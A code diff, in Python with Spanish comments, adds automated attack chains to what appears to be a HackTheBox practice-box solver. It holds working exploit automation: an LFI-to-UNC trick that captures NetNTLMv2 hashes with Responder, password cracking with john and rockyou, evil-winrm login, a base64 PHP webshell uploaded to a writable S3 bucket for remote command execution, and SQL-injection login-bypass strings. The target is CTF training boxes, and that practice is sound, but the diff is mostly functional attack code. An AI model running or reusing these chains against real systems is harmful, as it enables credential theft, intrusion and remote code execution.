@@ -296,6 +296,196 @@ WEB_WORDLIST = "/usr/share/wordlists/dirb/common.txt"
 _SQLI_BYPASS = ["admin' or '1'='1' -- -", "admin' or 1=1 -- -", "' or ''='", "admin'#"]
 
 
+def _tun_ip(client) -> str:
+    """IP de la Kali en la VPN (tun0) — la que oirá Responder cuando la víctima haga SMB."""
+    out = _run(client, "ip -4 -o a show tun0 2>/dev/null")
+    m = re.search(r"(10\.10\.\d+\.\d+)", out)
+    return m.group(1) if m else ""
+
+
+# Parámetros típicos de LFI en cajas web tipo Unika (index.php?page=...).
+_LFI_PARAMS = ["page", "file", "lang", "view", "include", "path", "p"]
+_TRAVERSAL = "../" * 10   # traversal hondo: sirve esté donde esté la raíz web
+
+
+def _detect_vhost(info: str):
+    """Saca un vhost *.htb de un meta-refresh / Location / enlace de la portada, o —si
+    no hay redirección— de cualquier mención .htb del cuerpo (p.ej. el email
+    mail@thetoppers.htb de la caja Three)."""
+    m = re.search(r"https?://([A-Za-z0-9.-]+\.htb)", info)
+    if m:
+        return m.group(1)
+    m = re.search(r"\b([A-Za-z0-9][A-Za-z0-9-]*\.htb)\b", info)
+    return m.group(1) if m else None
+
+
+def _fix_vhost_hosts(client, target, vhost, steps):
+    """Apunta el vhost a la IP ACTUAL en /etc/hosts (borra entradas viejas primero:
+    las IPs de HTB cambian en cada spawn y una entrada caduca resuelve a IP muerta)."""
+    pw = _sudo_pw()
+    _run(client,
+         f"echo {pw} | sudo -S bash -c \"sed -i '\\|{vhost}|d' /etc/hosts; "
+         f"printf '%s\\t%s\\n' '{target}' '{vhost}' >> /etc/hosts\"", timeout=20)
+    check = _run(client, f"grep {vhost} /etc/hosts")
+    _step(steps, "ENUM", f"vhost {vhost} → /etc/hosts",
+          "apuntado a la IP actual", check, [f"{vhost} -> {target}"])
+
+
+def _lfi_to_winrm(client, target, base, steps) -> list:
+    """Cadena tipo Unika: LFI en index.php?page= (Windows) -> Responder captura el
+    hash NetNTLMv2 al disparar el LFI contra una ruta UNC a nuestra Kali -> john lo
+    crackea con rockyou -> evil-winrm (5985) -> flag. Solo se dispara si CONFIRMA el
+    LFI leyendo windows/win.ini, así no molesta a cajas web normales."""
+    ck = "-k " if base.startswith("https") else ""
+    # 1) Confirmar LFI sobre Windows probando parámetros típicos.
+    prefix = prm = None
+    for p in _LFI_PARAMS:
+        for cand in (f"index.php?{p}=", f"?{p}="):
+            test = _run(client,
+                f"curl -s {ck}-m 10 '{base}/{cand}{_TRAVERSAL}windows/win.ini'", timeout=20)
+            if "16-bit app support" in test or "[extensions]" in test:
+                prefix, prm = f"{base}/{cand}", p
+                _step(steps, "EXPLOIT", f"LFI confirmado ({cand}…)",
+                      "lee ficheros de Windows", test[:500],
+                      [f"param={p}", "objetivo=Windows"])
+                break
+        if prefix:
+            break
+    if not prefix:
+        return []
+
+    # 2) IP de tun0 + arrancar Responder DESACOPLADO (setsid, fds redirigidos: si no,
+    #    muere al cerrar el canal SSH). Limpio el log viejo del target antes.
+    atk = _tun_ip(client)
+    if not atk:
+        _step(steps, "IA", "LFI→Responder", "sin IP de tun0; no se puede capturar hash")
+        return []
+    pw = _sudo_pw()
+    hashfile = f"/usr/share/responder/logs/SMB-NTLMv2-SSP-{target}.txt"
+    _run(client, f"echo {pw} | sudo -S bash -c 'pkill -f responder 2>/dev/null; "
+                 f"rm -f {hashfile}'; sleep 1", timeout=20)
+    _run(client, f"echo {pw} | sudo -S bash -c 'setsid responder -I tun0 -dwv "
+                 f"</dev/null >/tmp/lh_resp.log 2>&1 &'", timeout=20)
+    time.sleep(7)
+    # 3) Disparar el LFI hacia una ruta UNC a la Kali -> Windows se autentica por SMB.
+    for share in ("x", "share", "a"):
+        _run(client, f"curl -s {ck}-m 6 '{prefix}//{atk}/{share}' >/dev/null 2>&1", timeout=15)
+        time.sleep(2)
+    time.sleep(4)
+    hraw = _run(client, f"cat {hashfile} 2>/dev/null")
+    _run(client, f"echo {pw} | sudo -S pkill -f responder 2>/dev/null; echo k", timeout=20)
+    hashes = [l.strip() for l in hraw.splitlines()
+              if re.match(r"^[^:]+::[^:]+:[0-9a-fA-F]{16,}:", l.strip())]
+    if not hashes:
+        _step(steps, "IA", "Responder capturar NetNTLMv2",
+              "no se capturó hash", hraw[:400])
+        return []
+    h0 = hashes[0]
+    user = h0.split("::")[0]
+    _step(steps, "LOOT", "Responder capturó NetNTLMv2", f"hash de {user}",
+          h0[:160] + "…", [f"usuario={user}"])
+
+    # 4) Crackear el NetNTLMv2 con john + rockyou.
+    _run(client, f"printf '%s\\n' '{h0}' > /tmp/lh_hash.txt", timeout=15)
+    _run(client, "john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt "
+                 "/tmp/lh_hash.txt 2>&1", timeout=240)
+    show = _run(client, "john --show --format=netntlmv2 /tmp/lh_hash.txt 2>&1", timeout=30)
+    mpw = re.search(rf"^{re.escape(user)}:([^:]+):", show, re.M)
+    if not mpw:
+        _step(steps, "EXPLOIT", "john crackear NetNTLMv2",
+              "no se crackeó con rockyou", show[:300])
+        return []
+    cred = mpw.group(1)
+    _step(steps, "EXPLOIT", "john crackeó la contraseña", f"{user}:{cred}",
+          show[:160], [f"cred={user}:{cred}"])
+
+    # 5) evil-winrm (5985) -> leer flags. Barras normales en rutas Windows: printf
+    #    interpreta \f, \t,… y rompería C:\Users\... ; PowerShell acepta C:/Users/...
+    psc = ("Get-Content C:/Users/*/Desktop/*.txt,C:/Users/*/Documents/*.txt "
+           "-ErrorAction SilentlyContinue\nexit\n")
+    out = _run(client,
+        f"printf '%s' '{psc}' | evil-winrm -i {target} -u '{user}' -p '{cred}' 2>&1",
+        timeout=120)
+    # evil-winrm intercala secuencias ANSI (p.ej. \x1b[1G) pegadas al texto; si no se
+    # limpian, una letra de la secuencia rompe el \b de FLAG_RE y la flag no matchea.
+    clean = re.sub(r"\x1b\[[0-9;?]*[A-Za-z]", "", out)
+    flags = list(dict.fromkeys(FLAG_RE.findall(clean)))
+    _step(steps, "LOOT" if flags else "EXPLOIT", f"evil-winrm {user}@{target}:5985",
+          "flag!" if flags else "conectado sin flag (revisa rutas)", out[-1500:],
+          [f"flag={flags[0]}"] if flags else [])
+    return flags
+
+
+# Webshell PHP mínima en base64 (evita el infierno de comillas con $_GET al pasarla
+# por SSH desde Windows). Decodifica a: <?php system($_GET['c']); ?>
+_WEBSHELL_B64 = "PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="
+# El S3 falso de estas cajas acepta CUALQUIER credencial; con env dummy basta.
+_AWSENV = "AWS_ACCESS_KEY_ID=x AWS_SECRET_ACCESS_KEY=x AWS_DEFAULT_REGION=us-east-1"
+
+
+def _s3_bucket_rce(client, target, vhost, steps) -> list:
+    """Cadena tipo Three: la web sirve desde un bucket de un S3 falso (s3.<vhost>) que
+    acepta credenciales cualquiera. Si un bucket ES la raíz web, subes una webshell PHP
+    por 'aws s3 cp' y tienes RCE -> flag. Solo se dispara si el endpoint S3 responde su
+    firma típica ({"status": "running"} / XML de S3), para no molestar a webs normales."""
+    s3host = f"s3.{vhost}"
+    pw = _sudo_pw()
+    # 1) Apuntar s3.<vhost> a la IP ACTUAL (las IPs HTB cambian en cada spawn).
+    _run(client,
+         f"echo {pw} | sudo -S bash -c \"sed -i '\\|{s3host}|d' /etc/hosts; "
+         f"printf '%s\\t%s\\n' '{target}' '{s3host}' >> /etc/hosts\"", timeout=20)
+    # 2) ¿Hay un S3 falso escuchando?
+    sig = _run(client, f"curl -s -m 12 http://{s3host}/", timeout=20)
+    low = sig.lower()
+    if "running" not in low and "listallmybuckets" not in low and "<bucket" not in low:
+        return []
+    ep = f"--endpoint-url=http://{s3host}"
+    _step(steps, "ENUM", f"S3 falso en {s3host}", "responde firma S3", sig[:300])
+    # 3) Listar buckets con credenciales dummy.
+    buckets_raw = _run(client, f"{_AWSENV} aws {ep} s3 ls 2>&1", timeout=30)
+    buckets = [m for m in re.findall(r"(?m)\s(\S+)\s*$", buckets_raw)
+               if "." in m or "-" in m]
+    _step(steps, "ENUM", f"aws s3 ls @ {s3host}",
+          f"{len(buckets)} bucket(s)", buckets_raw, [f"buckets={buckets}"])
+    if not buckets:
+        return []
+    # 4) Buscar el bucket que es la raíz web (index.php/.htaccess/index.html).
+    for b in buckets:
+        ls = _run(client, f"{_AWSENV} aws {ep} s3 ls s3://{b} 2>&1", timeout=30)
+        if not re.search(r"index\.php|index\.html|\.htaccess", ls):
+            continue
+        _step(steps, "EXPLOIT", f"bucket '{b}' = raíz web",
+              "subo webshell PHP", ls, [f"bucket={b}"])
+        # 5) Montar y subir la webshell.
+        _run(client, f"echo {_WEBSHELL_B64} | base64 -d > /tmp/lh.php", timeout=15)
+        _run(client, f"{_AWSENV} aws {ep} s3 cp /tmp/lh.php s3://{b}/lh.php 2>&1", timeout=30)
+        time.sleep(3)
+        # 6) RCE: la webshell se sirve por Apache; probar hosts plausibles.
+        for h in dict.fromkeys([target, vhost, b]):
+            rce = _run(client,
+                f'curl -s -m 12 -G --data-urlencode "c=id" http://{h}/lh.php', timeout=20)
+            if "uid=" not in rce:
+                continue
+            # 7) Leer la flag (rutas típicas + búsqueda acotada). -G url-encode lo hace curl.
+            loot = _run(client,
+                'curl -s -m 25 -G --data-urlencode '
+                '"c=cat /var/www/flag.txt /var/www/html/flag.txt /home/*/user.txt '
+                '/root/root.txt 2>/dev/null; find / -maxdepth 5 \\( -name flag.txt -o '
+                f'-name user.txt \\) 2>/dev/null | head" http://{h}/lh.php', timeout=45)
+            flags = list(dict.fromkeys(FLAG_RE.findall(loot)))
+            # 8) Limpieza best-effort del bucket (la copia local muere en el reset).
+            _run(client, f"{_AWSENV} aws {ep} s3 rm s3://{b}/lh.php 2>&1; rm -f /tmp/lh.php",
+                 timeout=20)
+            _step(steps, "LOOT" if flags else "EXPLOIT",
+                  f"RCE webshell (www-data) @ {h}/lh.php",
+                  "flag!" if flags else "RCE OK sin flag (revisa rutas)",
+                  (rce + "\n" + loot)[:1500], [f"flag={flags[0]}"] if flags else [])
+            if flags:
+                return flags
+        _run(client, f"{_AWSENV} aws {ep} s3 rm s3://{b}/lh.php 2>&1", timeout=20)
+    return []
+
+
 def _http_scan(client, target, steps, scheme) -> list:
     """Estilo Appointment: web (80/443) -> fingerprint + gobuster + caza de flags +
     intento de SQLi auth bypass. Lo que no caiga aquí queda servido para el cerebro."""
@@ -315,6 +505,26 @@ def _http_scan(client, target, steps, scheme) -> list:
           else (["formulario de login en /"] if has_login else []))
     if flags:
         return flags
+
+    # 1b) ¿La portada redirige a un vhost *.htb? Apúntalo a la IP actual en /etc/hosts
+    #     y a partir de aquí trabaja contra el vhost (la app suele exigirlo).
+    vhost = _detect_vhost(info)
+    if vhost and vhost not in base:
+        _fix_vhost_hosts(client, target, vhost, steps)
+        base = f"{scheme}://{vhost}"
+
+    # 1c) Cadena LFI -> Responder -> john -> evil-winrm (cajas Windows tipo Unika).
+    #     Si confirma LFI y crackea el hash, owna la caja sin tocar gobuster/SQLi.
+    lfi_flags = _lfi_to_winrm(client, target, base, steps)
+    if lfi_flags:
+        return list(dict.fromkeys(flags + lfi_flags))
+
+    # 1d) Cadena S3-bucket-RCE (cajas tipo Three): si la web revela un dominio .htb con
+    #     un S3 falso cuyo bucket es la raíz web, sube webshell -> RCE -> flag.
+    if vhost:
+        s3_flags = _s3_bucket_rce(client, target, vhost, steps)
+        if s3_flags:
+            return list(dict.fromkeys(flags + s3_flags))
 
     # 2) Descubrimiento de rutas con gobuster (silencioso, acotado).
     paths_out = _run(client,
